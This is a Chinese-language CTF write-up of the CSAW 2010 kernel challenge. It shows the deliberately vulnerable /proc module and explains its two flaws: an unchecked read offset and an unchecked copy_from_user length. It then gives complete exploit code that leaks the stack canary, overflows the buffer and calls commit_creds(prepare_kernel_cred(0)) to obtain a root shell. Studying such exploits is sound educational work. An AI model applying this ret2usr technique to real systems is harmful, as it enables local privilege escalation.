# CSAW2010 kernel

## Author：Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>算是第一道Linux kernel的stack smashing的实例题，是非常古老的一道题，但是入门嘛就越简单越好，不是啥都能一蹴而就的，直接上太难的题目会让人一头雾水。那么废话不多说了，先来看看这道题的漏洞代码：</font></br>

```C
/*
 * csaw.c
 * CSAW CTF Challenge Kernel Module
 * Jon Oberheide <jon@oberheide.org>
 *
 * This module implements the /proc/csaw interface which can be read
 * and written like a normal file. For example:
 *
 * $ cat /proc/csaw
 * Welcome to the CSAW CTF challenge. Best of luck!
 * $ echo "Hello World" > /proc/csaw
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <asm/uaccess.h>

#define MAX_LENGTH 64

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jon Oberheide");
MODULE_DESCRIPTION("CSAW CTF Challenge Kernel Module");

static struct proc_dir_entry *csaw_proc;

int
csaw_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
{
    char buf[MAX_LENGTH];

    unsigned int x = (unsigned int) &buf[0];
    memset(&buf[0], 0, sizeof(buf));

    x -= 20;

    printk(KERN_ERR "csaw: called csaw_write 2010\n");

    // print_hex_dump(KERN_INFO, "raw data: ", DUMP_PREFIX_ADDRESS,
    //           16, 4, (void *) x, 120 * sizeof(int), 1);

    /*
     * We should be safe to perform this copy from userspace since our
     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary
     * on the kernel stack to protect against smashing the stack.
     *
     * While the user could easily DoS the kernel, I don't think they
     * should be able to escalate privileges without discovering the
     * secret stack canary value.
     */
    if (copy_from_user(&buf, ubuf, count)) {
        printk(KERN_INFO "csaw: error copying data from userspace\n");
        return -EFAULT;
    }

//   print_hex_dump(KERN_INFO, "raw data: ", DUMP_PREFIX_ADDRESS,
//              16, 4, (void *) x, 120 * sizeof(int), 1);

    return count;
}

int
csaw_read(char *page, char **start, off_t off, int count, int *eof, void *data)
{
    char buf[MAX_LENGTH];

    printk(KERN_INFO "csaw: called csaw_read 2010\n");

    *eof = 1;
    memset(buf, 0, sizeof(buf));
    strcpy(buf, "Welcome to the CSAW CTF challenge. Best of luck!\n");
    memcpy(page, buf + off, MAX_LENGTH);

    return MAX_LENGTH;
}

static int __init
csaw_init(void)
{
    printk(KERN_INFO "csaw: loading module\n");

    csaw_proc = create_proc_entry("csaw2010", 0666, NULL);
    csaw_proc->read_proc = csaw_read;
    csaw_proc->write_proc = csaw_write;

    printk(KERN_INFO "csaw: created /proc/csaw2010 entry\n");

    return 0;
}

static void __exit
csaw_exit(void)
{
    if (csaw_proc) {
        remove_proc_entry("csaw2010", csaw_proc);
    }

    printk(KERN_INFO "csaw: unloading module\n");
}

module_init(csaw_init);
module_exit(csaw_exit);
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>Makefile我改成了自己的：</font></br>

```makefile
obj-m := csaw.o  

KERNELDR := /home/fanda/Desktop/file/linux-2.6.32.1
BUSYDIR  := /home/fanda/Desktop/file/busybox-1.29.3/_install/mytest
PWD := $(shell pwd)  

modules:  
	$(MAKE) -C $(KERNELDR) M=$(PWD) modules  
	gcc -o poc poc.c -static
	rm $(BUSYDIR)/*.ko
	rm $(BUSYDIR)/poc
	cp *.ko $(BUSYDIR)
	cp poc $(BUSYDIR)
	cd $(BUSYDIR)/../ && find . | cpio -o --format=newc > ../rootfs.img
clean:  
	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>仿佛回到了刚学pwn入门学stack overflow一样了嘿嘿。首先根据注释我们可以得到模块应该是开启了栈保护，也就是有一个canary的；然后从注册模块的函数看起，可以看到设置了read_proc和write_proc函数：</font></br>

- csaw_read：函数初始化了一个局部缓冲区，写入了一个字符串，然后根据传入参数的偏移给用户层的缓冲区复制数据。这里有一个明显的问题就是off偏移是可以由用户层指定的，这样的话如果有一个特定的off就可以泄漏出stack canary。

- csaw_write：漏洞更加明显，copy_from_user函数的参数count直接从用户层得到，这就使得可以传入任意大小的数值，可以写入任意长度的数据。

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来我们先泄漏canary，思路很简单，read时首先设置一个偏移，然后直接读取出来就行了：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
    int fd = open("/proc/csaw", O_RDWR);
    if (!fd) {
        printf("error\n");
        exit(1);
    }
    lseek(fd, 16, SEEK_CUR); // 设置偏移，使得读取的数据包含canary
    char buffer[64] = {0};
    read(fd, buffer, 64); 
    int i, j;
    for (i = 0; i < 4; i++) { // 打印从内核读出的数据
        for (j = 0; j < 16; j++) printf("%02x ", buffer[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16 ; j++) printf("%c", buffer[i*16+j] & 0xff);
        printf("\n");
    }
    char canary[4] = {0};
    memcpy(canary, buffer+32, 4); // canary在dump数据里的偏移
    printf("CANARY:");
    for (i = 0; i < 4; i++) printf("%02x", canary[i] & 0xff);
    printf("\n");
    return 0;
}

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这样就能很简单的泄漏出canary了（只是我不太明白在内核中0x40-0x10之后canary应该在0x30偏移处吧，不知道为啥用户层缓冲区里前0x10个字节没了，偏移成了0x20），有了canary我们就可以绕过栈保护，接下来就是常规的栈溢出攻击了，原理第二节讲过了所以不赘述了，最终poc如下：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame {
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
} __attribute__((packed));

void launch_shell(void)
{
    execl("/bin/sh", "sh", NULL);
}

struct trap_frame tf;
void prepare_tf(void)
{
    asm("pushl %cs; popl tf+4;"
        "pushfl; popl tf+8;"
        "pushl %esp; popl tf+12;"
        "pushl %ss; popl tf+16;");
    tf.eip = &launch_shell;
    tf.esp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xc1067fc0;
void *(*commit_creds)(void *) KERNCALL = (void *) 0xc1067e20;
void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret;");
}

int main(int argc, char *argv[])
{
    int fd = open("/proc/csaw2010", O_RDWR);
    if (!fd) {
        printf("error\n");
        exit(1);
    }
    lseek(fd, 16, SEEK_CUR);
    char buffer[64];
    read(fd, buffer, 64);
    int i, j;
    for (i = 0; i < 4; i++) {
        for (j = 0; j < 16; j++) printf("%02x ", buffer[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", buffer[i*16+j] & 0xff);
        printf("\n");
    }
    char canary[4];
    memcpy(canary, buffer+0x20, 4);
    printf("CANARY:");
    for (i = 0; i < 4; i++) printf("%02x", canary[i] & 0xff);
    printf("\n");
    char exp[88];
    memset(exp, 0x41, 88);
    memcpy(exp+64, canary, 4);
    *((void **)(exp+64+4+4+4+4+4)) = &payload; 
    printf("[*]payload:%s\n", exp);
    printf("Triger bug:\n");
    prepare_tf();
    write(fd, exp, 88);
    return 0;
}

```

